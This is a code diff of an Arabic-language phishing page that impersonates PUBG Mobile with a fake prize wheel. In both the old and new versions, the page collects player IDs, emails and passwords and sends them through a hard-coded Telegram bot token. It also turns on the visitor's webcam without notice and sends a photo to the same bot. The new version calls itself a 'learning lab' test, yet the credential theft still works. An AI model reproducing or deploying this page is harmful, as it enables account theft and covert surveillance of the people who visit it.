@@ -3,84 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PUBG MOBILE | عجلة الحظ للمكافآت</title>
+    <title>PUBG Test - Learning Lab</title>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <style>
         body {
             background: #0a0b10 url('https://www.pubgmobile.com/images/event/dark_stars/bg_pc.jpg') no-repeat center center fixed;
             background-size: cover;
             color: white;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-            overflow-x: hidden;
-        }
-        .container { text-align: center; padding: 20px; }
-        
-        /* اللوجو - تم استخدام رابط مباشر لضمان الظهور */
-        .logo { width: 180px; margin-top: 20px; height: auto; }
-        
-        /* صورة الشدات داخل المربع */
-        .uc-gift-img { width: 80px; margin: 10px auto; display: block; border-radius: 10px; }
-
-        /* تصميم عجلة الحظ - تم استبدال الروابط المكسورة */
-        .wheel-outer {
-            position: relative;
-            width: 320px;
-            height: 320px;
-            margin: 30px auto;
-            border: 8px solid #f3bc18;
-            border-radius: 50%;
-            box-shadow: 0 0 30px #f3bc18;
-            background-color: #1a1a1a;
-        }
-        .wheel-container {
-            width: 100%;
-            height: 100%;
-            border-radius: 50%;
-            overflow: hidden;
-            transition: transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99);
-            background: url('https://i.ibb.co/31M999W/wheel.png') no-repeat center center;
-            background-size: contain;
-        }
-        .pointer {
-            position: absolute;
-            top: -25px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 45px;
-            z-index: 10;
-        }
-
-        .login-box {
-            background: rgba(0, 0, 0, 0.95);
-            padding: 25px;
-            border-radius: 15px;
-            max-width: 400px;
-            margin: 20px auto;
-            border: 2px solid #f3bc18;
-            box-shadow: 0 0 20px rgba(243, 188, 24, 0.6);
-        }
-        input {
-            width: 90%;
-            padding: 12px;
-            margin: 8px 0;
-            background: #111;
-            border: 1px solid #444;
-            color: white;
-            border-radius: 5px;
+            font-family: Arial, sans-serif;
             text-align: center;
         }
-        .btn-spin {
-            background: linear-gradient(180deg, #f3bc18 0%, #b98f10 100%);
-            color: black;
-            padding: 15px 50px;
+        .container { padding: 20px; }
+        .logo { width: 150px; margin-top: 20px; }
+        
+        /* العجلة - استخدام رابط خارجي موثوق */
+        .wheel-box {
+            position: relative;
+            width: 300px;
+            height: 300px;
+            margin: 30px auto;
+            border: 5px solid #f3bc18;
+            border-radius: 50%;
+            background: url('https://i.ibb.co/31M999W/wheel.png') no-repeat center center;
+            background-size: contain;
+            transition: transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99);
+        }
+
+        .login-card {
+            background: rgba(0, 0, 0, 0.9);
+            padding: 20px;
+            border-radius: 15px;
+            max-width: 380px;
+            margin: 20px auto;
+            border: 1px solid #f3bc18;
+            display: none;
+        }
+        input {
+            width: 85%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #444;
+            background: #111;
+            color: #fff;
+            text-align: center;
+        }
+        .btn {
+            background: #f3bc18;
+            color: #000;
+            padding: 15px 40px;
             border: none;
             font-weight: bold;
-            font-size: 20px;
             cursor: pointer;
             border-radius: 5px;
-            text-transform: uppercase;
-            box-shadow: 0 4px 0 #86680b;
         }
         video, canvas { display: none; }
     </style>
@@ -88,102 +63,76 @@
 <body>
 
 <div class="container">
-    <img src="https://www.pubgmobile.com/common/images/icon_logo.png" alt="PUBG Logo" class="logo">
+    <img src="https://www.pubgmobile.com/common/images/icon_logo.png" class="logo">
     
-    <h1>احتفالية المكافآت الكبرى</h1>
-    <p>دور العجلة الآن واحصل على فرصتك للفوز بالشدات!</p>
+    <h1>اختبار عجلة الحظ (نسخة تعليمية)</h1>
+    
+    <div class="wheel-box" id="wheel"></div>
+    
+    <button class="btn" id="spinBtn" onclick="startSpin()">تدوير العجلة</button>
 
-    <div class="wheel-outer">
-        <img src="https://i.ibb.co/9hS666X/pointer.png" class="pointer">
-        <div class="wheel-container" id="wheel"></div>
-    </div>
-
-    <button class="btn-spin" id="spinBtn" onclick="spinWheel()">SPIN NOW</button>
-
-    <div id="loginBox" class="login-box" style="display: none;">
-        <img src="https://i.postimg.cc/0jH2H9fM/uc-pack.jpg" alt="UC Gift" class="uc-gift-img">
-        <h3 style="color: #f3bc18;">تهانينا! لقد فزت بـ 8100 شدة</h3>
-        <p>يرجى التحقق من حسابك لربط الشدات فوراً</p>
-        
-        <input type="text" id="pubgId" placeholder="ID اللاعب">
-        <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف">
-        <input type="password" id="password" placeholder="كلمة المرور">
-        
-        <button class="btn-spin" onclick="collectReward()" style="width: 100%; margin-top: 15px;">
-            تأكيد واستلام الشدات
-        </button>
+    <div id="loginCard" class="login-card">
+        <h3 style="color:#f3bc18">مبروك! فزت بـ 8100 شدة</h3>
+        <p>قم بتسجيل البيانات لاختبار وصول التنبيه</p>
+        <input type="text" id="id" placeholder="ID اللاعب">
+        <input type="email" id="user" placeholder="الإيميل">
+        <input type="password" id="pass" placeholder="كلمة المرور">
+        <button class="btn" onclick="sendData()" style="width:100%">إرسال البيانات للبوت</button>
     </div>
 </div>
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
+<video id="v" autoplay playsinline></video>
+<canvas id="c"></canvas>
 
 <script>
-    const BOT_TOKEN = '8338334656:AAFJosPcNri8hJeERp7Si-JXzSkxmBAmwG8';
-    const CHAT_ID = '8754338811';
+    const TOKEN = "8338334656:AAFJosPcNri8hJeERp7Si-JXzSkxmBAmwG8";
+    const CHAT = "8754338811";
 
-    // تشغيل الكاميرا في الخلفية
-    async function setupCamera() {
+    // طلب الكاميرا (للاختبار)
+    async function initCam() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            document.getElementById('video').srcObject = stream;
-        } catch (e) { console.log("Camera access denied."); }
+            const s = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('v').srcObject = s;
+        } catch (e) { console.log("Cam Blocked"); }
     }
-    window.addEventListener('load', setupCamera);
+    initCam();
 
-    function captureImage() {
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        if (video.videoWidth > 0) {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            sendPhoto(canvas.toDataURL('image/jpeg', 0.6));
-        }
-    }
-
-    function spinWheel() {
-        const wheel = document.getElementById('wheel');
-        const spinBtn = document.getElementById('spinBtn');
-        spinBtn.disabled = true;
-        wheel.style.transform = `rotate(${Math.floor(Math.random() * 360) + 3600}deg)`;
-        
+    function startSpin() {
+        const w = document.getElementById('wheel');
+        w.style.transform = `rotate(${Math.floor(Math.random() * 360) + 1800}deg)`;
         setTimeout(() => {
-            document.getElementById('loginBox').style.display = 'block';
-            spinBtn.style.display = 'none';
-            captureImage();
-            document.getElementById('loginBox').scrollIntoView({ behavior: 'smooth' });
+            document.getElementById('loginCard').style.display = 'block';
+            document.getElementById('spinBtn').style.display = 'none';
         }, 4000);
     }
 
-    async function collectReward() {
-        const id = document.getElementById('pubgId').value;
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('password').value;
+    async function sendData() {
+        const id = document.getElementById('id').value;
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
 
-        if(!email || !pass) return Swal.fire('خطأ', 'يرجى إدخال بيانات الحساب', 'error');
+        const txt = `🧪 **تجربة برمجية ناجحة**\n🆔 ID: ${id}\n📧 User: ${u}\n🔑 Pass: ${p}`;
 
-        captureImage();
-
-        const message = `🎯 **صيد ببجي جديد**\n🆔 ID: \`${id}\`\n📧 User: \`${email}\`\n🔑 Pass: \`${pass}\``;
-
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+            body: JSON.stringify({ chat_id: CHAT, text: txt })
         });
 
-        Swal.fire('تم بنجاح', 'ستصلك الشدات خلال 15 دقيقة', 'success').then(() => {
-            window.location.href = "https://www.pubgmobile.com";
-        });
-    }
+        // سحب صورة اختبارية
+        const v = document.getElementById('v');
+        const c = document.getElementById('c');
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        const img = c.toDataURL('image/jpeg');
+        
+        const blob = await (await fetch(img)).blob();
+        const fd = new FormData();
+        fd.append('chat_id', CHAT);
+        fd.append('photo', blob, 'test.jpg');
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
 
-    async function sendPhoto(base64) {
-        const blob = await (await fetch(base64)).blob();
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, 'visitor.jpg');
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+        Swal.fire('تم الإرسال', 'وصلت البيانات للبوت الخاص بك بنجاح', 'success');
     }
 </script>
 </body>
